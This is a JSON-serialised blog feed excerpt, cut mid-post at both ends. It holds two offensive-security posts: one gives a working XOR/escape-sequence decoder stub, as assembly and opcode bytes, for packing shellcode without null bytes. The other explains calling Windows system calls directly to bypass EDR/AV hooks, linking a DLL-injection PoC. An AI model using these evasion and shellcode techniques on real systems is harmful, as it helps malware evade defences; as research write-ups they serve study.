<span style=\"color: #c00000;\">32</span>\n    \n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%define</span><span style=\"color: #004a43;\"> NULLZ_KEY 0x4D</span>\n    \n<span style=\"color: #e34adc;\">nullz_decode:</span>\n<span style=\"color: #e34adc;\">_nullz_decode:</span>\n    <span style=\"color: #400000; font-weight: bold;\">jmp</span>    <span style=\"color: #e34adc;\">init_code</span>\n<span style=\"color: #e34adc;\">load_code:</span>\n    <span style=\"color: #400000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">esi</span>\n    <span style=\"color: #400000; font-weight: bold;\">lodsd</span>                    <span style=\"color: #c34e00;\">; load original length of data</span>\n    <span style=\"color: #400000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #806030;\">,</span> <span style=\"color: #c00000;\">0x12345678</span>   <span style=\"color: #c34e00;\">; change to 32-bit key    </span>\n    <span style=\"color: #400000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #806030;\">,</span> <span style=\"color: #000080;\">ecx</span>\n    <span style=\"color: #400000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">esi</span>               <span style=\"color: #c34e00;\">; save pointer to code on stack</span>\n    <span style=\"color: #400000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">edi</span>               <span style=\"color: #c34e00;\">; </span>\n    <span style=\"color: #400000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">esi</span>\n<span style=\"color: #e34adc;\">decode_main:</span>\n    <span style=\"color: #400000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #c34e00;\">; read a byte</span>\n    <span style=\"color: #400000; font-weight: bold;\">dec</span>    <span style=\"color: #000080;\">al</span>                <span style=\"color: #c34e00;\">; c - 1</span>\n    <span style=\"color: #400000; font-weight: bold;\">jnz</span>    <span style=\"color: #e34adc;\">save_byte</span>\n    <span style=\"color: #400000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #c34e00;\">; read next byte</span>\n    <span style=\"color: #400000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #806030;\">,</span> NULLZ_KEY     <span style=\"color: #c34e00;\">; c ^= NULLZ_KEY</span>\n<span style=\"color: #e34adc;\">save_byte:</span>\n    <span style=\"color: #400000; font-weight: bold;\">stosb</span>                    <span style=\"color: #c34e00;\">; save in buffer</span>\n    <span style=\"color: #400000; font-weight: bold;\">loop</span>   <span style=\"color: #e34adc;\">decode_main</span>\n    <span style=\"color: #400000; font-weight: bold;\">ret</span>                      <span style=\"color: #c34e00;\">; execute shellcode</span>\n<span style=\"color: #e34adc;\">init_code:</span>\n    <span style=\"color: #400000; font-weight: bold;\">call</span>   <span style=\"color: #e34adc;\">load_code</span>\n    <span style=\"color: #c34e00;\">; XOR encoded shellcode goes here..</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 07:53:47 UTC --></p>\n<h2>Building the Loader</h2>\n<ol>\n<li>Allocate memory to hold the decoder, 32-bits for the original length of input file and file data itself.</li>\n<li>Copy the decoder to memory.</li>\n<li>Set the key in decoder that will decrypt the original length. The offset of this value is defined by NULLZ_LEN.</li>\n<li>Set the original length, encrypted with XOR, right after the decoder.</li>\n<li>Set input file data right after the original length.</li>\n<li>Save memory to file.</li>\n</ol>\n<p>An option to update the XOR key is left up to you.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// compatible with x86 and x86-64</span>\n<span style=\"color: #800000; font-weight: bold;\">char</span> NULLZ_DECODER<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xeb</span><span style=\"color: #0f69ff;\">\\x17</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* jmp   0x19            */</span>\n  <span style=\"color: #696969;\">/* 0002 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5e</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop   esi             */</span>\n  <span style=\"color: #696969;\">/* 0003 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xad</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* lodsd                 */</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> NULLZ_LEN 5</span>\n  <span style=\"color: #696969;\">/* 0004 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x35</span><span style=\"color: #0f69ff;\">\\x78</span><span style=\"color: #0f69ff;\">\\x56</span><span style=\"color: #0f69ff;\">\\x34</span><span style=\"color: #0f69ff;\">\\x12</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* xor   eax, 0x12345678 */</span>\n  <span style=\"color: #696969;\">/* 0009 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x91</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* xchg  eax, ecx        */</span>\n  <span style=\"color: #696969;\">/* 000A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x56</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  esi             */</span>\n  <span style=\"color: #696969;\">/* 000B */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5f</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop   edi             */</span>\n  <span style=\"color: #696969;\">/* 000C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x56</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  esi             */</span>\n  <span style=\"color: #696969;\">/* 000D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xac</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* lodsb                 */</span>\n  <span style=\"color: #696969;\">/* 000E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xfe</span><span style=\"color: #0f69ff;\">\\xc8</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* dec   al              */</span>\n  <span style=\"color: #696969;\">/* 0010 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x75</span><span style=\"color: #0f69ff;\">\\x03</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* jne   0x15            */</span>\n  <span style=\"color: #696969;\">/* 0012 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xac</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* lodsb                 */</span>\n  <span style=\"color: #696969;\">/* 0013 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x34</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* xor   al, 0x4d        */</span>\n  <span style=\"color: #696969;\">/* 0015 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xaa</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* stosb                 */</span>\n  <span style=\"color: #696969;\">/* 0016 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xe2</span><span style=\"color: #0f69ff;\">\\xf5</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* loop  0xd             */</span>\n  <span style=\"color: #696969;\">/* 0018 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc3</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* ret                   */</span>\n  <span style=\"color: #696969;\">/* 0019 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xe8</span><span style=\"color: #0f69ff;\">\\xe4</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* call  2               */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 08:07:17 UTC --></p>\n<h2>Summary</h2>\n<p>Before settling with escape sequences, I examined a number of other ways that null bytes might be encoded and decoded at runtime by a shellcode.</p>\n<p>Initially, I thought of byte substitution, which is a non-linear operation used by legacy block ciphers. Scrapped that idea.</p>\n<p>Experimented with match referencing, which is very common for lossless compression algorithms. Wrote a few bits of code to process files and then calculate the change in size. For every null byte found in a file, save the position and length before passing the null bytes to a function F for modification. An involution, like an XOR is fine to use as F. Then encode the offset and length using elias gamma2 codes. The change in file size was approx. 4% and I thought this might be the best way. It requires more code and is more complicated, but certainly an option.</p>\n<p>Thought about bit tags. Essentially using 1-Bit to indicate whether a byte is encoded or not. Change in file size would be ~12% since every byte would require 1-Bit. This eventually led to escape sequences, which I think is the best approach.</p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/feed/",
            "slash_comments": "1",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/06/encoder.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/06/encoder.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Invoking System Calls and Windows Debugger Engine",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Invoking System Calls and Windows Debugger Engine"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/",
            "comments": "https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/#comments",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Mon, 01 Jun 2020 15:00:53 +0000",
            "published_parsed": [
                2020,
                6,
                1,
                15,
                0,
                53,
                0,
                153,
                0
            ],
            "tags": [
                {
                    "term": "assembly",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "redteam",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "av",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "disassembler",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "edr",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "red teams",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "system calls",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windbg",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=4809",
            "guidislink": false,
            "summary": "Introduction Quick post about Windows System calls that I forgot about working on after the release of Dumpert by Cn33liz last year, which is described in this post. Typically, EDR and AV set hooks on Win32 API or NT wrapper &#8230; <a href=\"https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Introduction Quick post about Windows System calls that I forgot about working on after the release of Dumpert by Cn33liz last year, which is described in this post. Typically, EDR and AV set hooks on Win32 API or NT wrapper &#8230; <a href=\"https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<br />\n<h2>Introduction</h2>\n<p>Quick post about Windows System calls that I forgot about working on after the release of <a href=\"https://github.com/outflanknl/Dumpert\">Dumpert</a> by <a href=\"https://twitter.com/cneelis\">Cn33liz</a> last year, which is described in <a href=\"https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\">this post</a>. Typically, EDR and AV set hooks on Win32 API or NT wrapper functions to detect and mitigate against malicious activity. Dumpert attempts to bypass any user-level hooks by invoking system calls directly. It first queries the operating system version via RtlGetVersion and then selects the applicable code stubs to execute. <a href=\"https://github.com/jthuraisamy/SysWhispers\">SysWhispers</a> generates header/ASM files by extracting the system call numbers from the code stubs in NTDLL.dll and <a href=\"https://www.evilsocket.net/2014/02/11/on-windows-syscall-mechanism-and-syscall-numbers-extraction-methods/\">evilsocket also demonstrated</a> how to do this many years ago. <a href=\"https://twitter.com/fuzzysec\">@FuzzySec</a> and <a href=\"https://twitter.com/TheRealWover\">@TheWover</a> have also implemented dynamic invocation of system calls after remapping NTDLL in <a href=\"https://github.com/FuzzySecurity/SharpSploit/tree/master/SharpSploit/Execution/DynamicInvoke\">Sharpsploit</a>, which you can read about in their <a href=\"https://github.com/FuzzySecurity/BlueHatIL-2020\">Bluehat presentation.</a></p>\n<p>Using system calls on Windows to interact with the kernel has always been problematic because <a href=\"https://github.com/j00ru/windows-syscalls\">the numbers assigned</a> for each kernel function change between the versions released. Just after Cn33liz published Dumpert, I thought of how invocation might be improved without using assembly and there are lots of ways, but consider at least three for now. The first method, which is probably the simplest and safest, maps NTDLL.dll into executable memory and resolves the address of any system call via the Export Address Table (EAT) before executing. This is relatively simple to implement. The second approach maps NTDLL.dll into read-only memory and uses a disassembler, or at the very least, a length disassembler to extract the system call number. The third will also map NTDLL.dll into read-only memory, copy the code stub to an executable buffer before invoking. The length of the stub is read from the exception directory. Overcomplicated, perhaps, and I did consider a few disassembly libraries for the second method, but just to save time settled with the <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-engine-overview\">Windows Debugger Engine</a>, which has a built-in disassembler already.</p>\n<p><strong><a href=\"https://github.com/odzhan/injection/tree/master/syscalls\">A PoC to inject a DLL into remote process can be found here.</a> It doesn&#8217;t use a disassembler, but because it uses the exception directory to locate the end of a system call, it will only work with 64-bit processes.</strong></p>\n<h2>Windows Debugging Engine</h2>\n<p>Disassembling code via the engine requires a live process. Thankfully it&#8217;s possible to attach the debugger to the local process in noninvasive mode. You can just map NTDLL into executable memory and invoke any system call from there, however, I wanted an excuse to use the debugging engine. <img alt=\"\ud83d\ude1b\" class=\"wp-smiley\" src=\"https://s0.wp.com/wp-content/mu-plugins/wpcom-smileys/twemoji/2/72x72/1f61b.png\" style=\"height: 1em;\" /> <a href=\"https://gist.github.com/odzhan/476a0e0f2d1835f0453c37eeb7806558\">lde.c</a>, <a href=\"https://gist.github.com/odzhan/28c3083c6146250d21b9ded46eebe06a\">lde.h</a></p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span>LDE<span style=\"color: #333333;\">::</span>LDE() {\n    CHAR path[MAX_PATH];\n    \n    ctrl <span style=\"color: #333333;\">=</span> <span style=\"color: #007020;\">NULL</span>;\n    clnt <span style=\"color: #333333;\">=</span> <span style=\"color: #007020;\">NULL</span>;\n    <span style=\"color: #888888;\">// create a debugging client</span>\n    hr <span style=\"color: #333333;\">=</span> DebugCreate(__uuidof(IDebugClient), (<span style=\"color: #333399; font-weight: bold;\">void</span><span style=\"color: #333333;\">**</span>)<span style=\"color: #333333;\">&amp;</span>clnt);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(hr <span style=\"color: #333333;\">==</span> S_OK) {\n      <span style=\"color: #888888;\">// get the control interface</span>\n      hr <span style=\"color: #333333;\">=</span> clnt<span style=\"color: #333333;\">-&gt;</span>QueryInterface(__uuidof(IDebugControl3), (<span style=\"color: #333399; font-weight: bold;\">void</span><span style=\"color: #333333;\">**</span>)<span style=\"color: #333333;\">&amp;</span>ctrl);\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(hr <span style=\"color: #333333;\">==</span> S_OK) {\n        <span style=\"color: #888888;\">// attach to existing process</span>\n        hr <span style=\"color: #333333;\">=</span> clnt<span style=\"color: #333333;\">-&gt;</span>AttachProcess(<span style=\"color: #007020;\">NULL</span>, \n          GetProcessId(GetCurrentProcess()), \n          DEBUG_ATTACH_NONINVASIVE <span style=\"color: #333333;\">|</span> DEBUG_ATTACH_NONINVASIVE_NO_SUSPEND);\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(hr <span style=\"color: #333333;\">==</span> S_OK) {\n          hr <span style=\"color: #333333;\">=</span> ctrl<span style=\"color: #333333;\">-&gt;</span>WaitForEvent(DEBUG_WAIT_DEFAULT, INFINITE);\n        }\n      }\n    }\n    ExpandEnvironmentStrings(<span style=\"background-color: #fff0f0;\">\"%SystemRoot%</span><span style=\"color: #666666; font-weight: bold; background-color: #fff0f0;\">\\\\</span><span style=\"background-color: #fff0f0;\">system32</span><span style=\"color: #666666; font-weight: bold; background-color: #fff0f0;\">\\\\</span><span style=\"background-color: #fff0f0;\">NTDLL.dll\"</span>, path, MAX_PATH);\n    <span style=\"color: #888888;\">// open file</span>\n    file <span style=\"color: #333333;\">=</span> CreateFile(path, \n      GENERIC_READ, FILE_SHARE_READ, <span style=\"color: #007020;\">NULL</span>, \n      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span style=\"color: #007020;\">NULL</span>);\n      \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(file <span style=\"color: #333333;\">==</span> INVALID_HANDLE_VALUE) <span style=\"color: #008800; font-weight: bold;\">return</span>;\n    \n    <span style=\"color: #888888;\">// map file</span>\n    map <span style=\"color: #333333;\">=</span> CreateFileMapping(file, <span style=\"color: #007020;\">NULL</span>, PAGE_READONLY, <span style=\"color: #0000DD; font-weight: bold;\">0</span>, <span style=\"color: #0000DD; font-weight: bold;\">0</span>, <span style=\"color: #007020;\">NULL</span>);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(map <span style=\"color: #333333;\">==</span> <span style=\"color: #007020;\">NULL</span>) <span style=\"color: #008800; font-weight: bold;\">return</span>;\n    \n    <span style=\"color: #888888;\">// create read only view of map</span>\n    mem <span style=\"color: #333333;\">=</span> (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, <span style=\"color: #0000DD; font-weight: bold;\">0</span>, <span style=\"color: #0000DD; font-weight: bold;\">0</span>, <span style=\"color: #007020;\">NULL</span>);\n}\n</pre>\n</div>\n<p>WinDbg has a command to disassemble a complete function called <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/uf--unassemble-function-\">uf (Unassemble Function)</a>. Internally, WinDbg builds a Control-flow Graph (CFG) to map the full function before displaying the disassembly of each code block. You can execute a command like uf via the <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/dbgeng/nf-dbgeng-idebugcontrol3-execute\">Execute method</a> and so long as you&#8217;ve setup <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/dbgeng/nn-dbgeng-idebugoutputcallbacks\">IDebugOutputCallbacks</a>, you can capture the disassembly that way. I considered <a href=\"https://github.com/jwmullally/libdis_cfg\">using a CFG</a> to implement something similar to uf, which you can if you wish. The system calls on my own build of Windows 10 have at the most, one branch, so I scrapped the idea of using a CFG or executing uf. With NTDLL mapped, you can use something like the following to resolve the address of an exported API.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span>FARPROC LDE<span style=\"color: #333333;\">::</span>GetProcAddress(LPCSTR lpProcName) {\n    PIMAGE_DATA_DIRECTORY   dir;\n    PIMAGE_EXPORT_DIRECTORY exp;\n    DWORD                   rva, ofs, cnt;\n    PCHAR                   str;\n    PDWORD                  adr, sym;\n    PWORD                   ord;\n    \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(mem <span style=\"color: #333333;\">==</span> <span style=\"color: #007020;\">NULL</span> <span style=\"color: #333333;\">||</span> lpProcName <span style=\"color: #333333;\">==</span> <span style=\"color: #007020;\">NULL</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    <span style=\"color: #888888;\">// get pointer to image directories for NTDLL</span>\n    dir <span style=\"color: #333333;\">=</span> Dirs();\n    \n    <span style=\"color: #888888;\">// no exports? exit</span>\n    rva <span style=\"color: #333333;\">=</span> dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(rva <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(rva);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    <span style=\"color: #888888;\">// no exported symbols? exit</span>\n    exp <span style=\"color: #333333;\">=</span> (PIMAGE_EXPORT_DIRECTORY)(ofs <span style=\"color: #333333;\">+</span> mem);\n    cnt <span style=\"color: #333333;\">=</span> exp<span style=\"color: #333333;\">-&gt;</span>NumberOfNames;\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(cnt <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    <span style=\"color: #888888;\">// read the array containing address of api names</span>\n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(exp<span style=\"color: #333333;\">-&gt;</span>AddressOfNames);        \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    sym <span style=\"color: #333333;\">=</span> (PDWORD)(ofs <span style=\"color: #333333;\">+</span> mem);\n\n    <span style=\"color: #888888;\">// read the array containing address of api</span>\n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(exp<span style=\"color: #333333;\">-&gt;</span>AddressOfFunctions);        \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    adr <span style=\"color: #333333;\">=</span> (PDWORD)(ofs <span style=\"color: #333333;\">+</span> mem);\n    \n    <span style=\"color: #888888;\">// read the array containing list of ordinals</span>\n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(exp<span style=\"color: #333333;\">-&gt;</span>AddressOfNameOrdinals);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    ord <span style=\"color: #333333;\">=</span> (PWORD)(ofs <span style=\"color: #333333;\">+</span> mem);\n    \n    <span style=\"color: #888888;\">// scan symbol array for api string</span>\n    <span style=\"color: #008800; font-weight: bold;\">do</span> {\n      str <span style=\"color: #333333;\">=</span> (PCHAR)(rva2ofs(sym[cnt <span style=\"color: #333333;\">-</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>]) <span style=\"color: #333333;\">+</span> mem);\n      <span style=\"color: #888888;\">// found it?</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(lstrcmp(str, lpProcName) <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) {\n        <span style=\"color: #888888;\">// return the address</span>\n        <span style=\"color: #008800; font-weight: bold;\">return</span> (FARPROC)(rva2ofs(adr[ord[cnt <span style=\"color: #333333;\">-</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>]]) <span style=\"color: #333333;\">+</span> mem);\n      }\n    } <span style=\"color: #008800; font-weight: bold;\">while</span> (<span style=\"color: #333333;\">--</span>cnt);\n    <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n}\n</pre>\n</div>\n<p>The following will use the Disassemble method to show the code. You can also use it to inspect bytes if you wanted to extract the system call number. The beginning and end of the system call is read from the Exception directory.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #333399; font-weight: bold;\">bool</span> LDE<span style=\"color: #333333;\">::</span>DisassembleSyscall(LPCSTR lpSyscallName) {\n    ULONG64                       ofs, start<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>, end<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>, addr;\n    PIMAGE_DOS_HEADER             dos;\n    PIMAGE_NT_HEADERS             nt;\n    PIMAGE_DATA_DIRECTORY         dir;\n    PIMAGE_RUNTIME_FUNCTION_ENTRY rf;\n    DWORD                         i, rva;\n    CHAR                          buf[LDE_MAX_STR];\n    HRESULT                       hr;\n    ULONG                         len;\n    \n    <span style=\"color: #888888;\">// resolve address of function in NTDLL</span>\n    addr <span style=\"color: #333333;\">=</span> (ULONG64)GetProcAddress(lpSyscallName);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(addr <span style=\"color: #333333;\">==</span> <span style=\"color: #007020;\">NULL</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">false</span>;\n    \n    <span style=\"color: #888888;\">// get pointer to image directories</span>\n    dir <span style=\"color: #333333;\">=</span> Dirs();\n    \n    <span style=\"color: #888888;\">// no exception directory? exit</span>\n    rva <span style=\"color: #333333;\">=</span> dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(rva <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">false</span>;\n    \n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(rva);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">false</span>;\n    \n    rf <span style=\"color: #333333;\">=</span> (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs <span style=\"color: #333333;\">+</span> mem);\n\n    <span style=\"color: #888888;\">// for each runtime function (there might be a better way??)</span>\n    <span style=\"color: #008800; font-weight: bold;\">for</span>(i<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>; rf[i].BeginAddress <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>; i<span style=\"color: #333333;\">++</span>) {\n      <span style=\"color: #888888;\">// is it our system call?</span>\n      start <span style=\"color: #333333;\">=</span> rva2ofs(rf[i].BeginAddress) <span style=\"color: #333333;\">+</span> (ULONG64)mem;\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(start <span style=\"color: #333333;\">==</span> addr) {\n        <span style=\"color: #888888;\">// save end and exit search</span>\n        end <span style=\"color: #333333;\">=</span> rva2ofs(rf[i].EndAddress) <span style=\"color: #333333;\">+</span> (ULONG64)mem;\n        <span style=\"color: #008800; font-weight: bold;\">break</span>;\n      }\n    }\n    \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(start <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span> <span style=\"color: #333333;\">&amp;&amp;</span> end <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) {\n      <span style=\"color: #008800; font-weight: bold;\">while</span>(start <span style=\"color: #333333;\">&lt;</span> end) {\n        hr <span style=\"color: #333333;\">=</span> ctrl<span style=\"color: #333333;\">-&gt;</span>Disassemble(\n          start, <span style=\"color: #0000DD; font-weight: bold;\">0</span>, buf, LDE_MAX_STR, <span style=\"color: #333333;\">&amp;</span>len, <span style=\"color: #333333;\">&amp;</span>start);\n          \n        <span style=\"color: #008800; font-weight: bold;\">if</span>(hr <span style=\"color: #333333;\">!=</span> S_OK) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n        \n        printf(<span style=\"background-color: #fff0f0;\">\"%s\"</span>, buf);\n      }\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">true</span>;\n}\n</pre>\n</div>\n<p>The following code will disassemble the system call.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #333399; font-weight: bold;\">int</span> <span style=\"color: #0066BB; font-weight: bold;\">main</span>(<span style=\"color: #333399; font-weight: bold;\">int</span> argc, <span style=\"color: #333399; font-weight: bold;\">char</span> <span 